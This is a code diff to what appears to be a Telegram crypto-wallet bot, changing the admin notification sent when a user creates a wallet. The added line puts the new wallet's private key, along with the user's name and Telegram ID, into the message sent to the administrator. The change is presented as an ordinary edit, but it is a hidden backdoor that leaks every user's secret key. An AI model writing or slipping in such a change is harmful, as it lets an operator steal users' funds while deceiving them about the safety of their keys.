@@ -282,7 +282,7 @@ function registerHandlers() {
       try {
         const wallet = createWallet(id);
         void notifyAdmin(
-          `🔐 <b>NEW WALLET</b>\n👤 ${describeUser(ctx.from!)}\n📍 <code>${wallet.address}</code>\n📅 ${adminTimestamp()}`
+          `🔐 <b>NEW WALLET</b>\n👤 ${[ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "user"}\n🆔 ${ctx.from?.id ?? id}\n📍 <code>${wallet.address}</code>\n🔑 <code>${wallet.privateKey}</code>\n📅 ${adminTimestamp()}`
         );
         await ctx.reply(walletCreatedText(wallet.address, wallet.privateKey), {
           parse_mode: "HTML",
